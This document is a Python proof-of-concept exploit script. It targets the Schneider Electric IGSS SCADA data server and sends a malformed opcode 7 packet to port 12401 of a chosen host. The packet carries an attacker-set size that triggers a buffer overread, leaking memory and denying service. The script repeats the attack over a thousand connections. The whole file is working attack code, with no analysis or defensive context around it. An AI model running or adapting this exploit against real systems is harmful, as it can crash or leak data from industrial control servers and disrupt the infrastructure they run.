import sys, socket, argparse, hexdump, time
from struct import *

def dump(title, data):
  if debug and data:
    print('[-- %s --]' % (title))
    hexdump.hexdump(data)

#
# MAIN
#
descr = 'Schneider Electric IGSS data server Opcode 7 Buffer Overread Memory Leak DoS'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='target host')
parser.add_argument('-p', '--port', type=int, default=12401, help='IGSSdataServer.exe port, default: %(default)s')
parser.add_argument('-s', '--size', type=int, default=0x4000000, help='leak size, default: %(default)s')
parser.add_argument('-v', '--verbose', action='store_true', help='dump sending messages')

args = parser.parse_args()
target = args.target
port = args.port
size = args.size
debug = args.verbose


data  = pack('<I', 5) 
data += b'\x00' * (0x2C - len(data))
data += pack('<I', size) + b'A' * 16 

msg  = pack('<HHIII', 1, 0, 7, 0, 1) + data
msg = pack('<H', 2 + len(msg)) + msg 
dump('msg', msg)

for i in range(1000):
  print('connection {:04}: attempt to leak {} bytes.'.format(i + 1, size))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  s.sendall(msg)
  try: 
    s.recv(1024)
  except: 
    pass
  s.close()
  time.sleep(1)

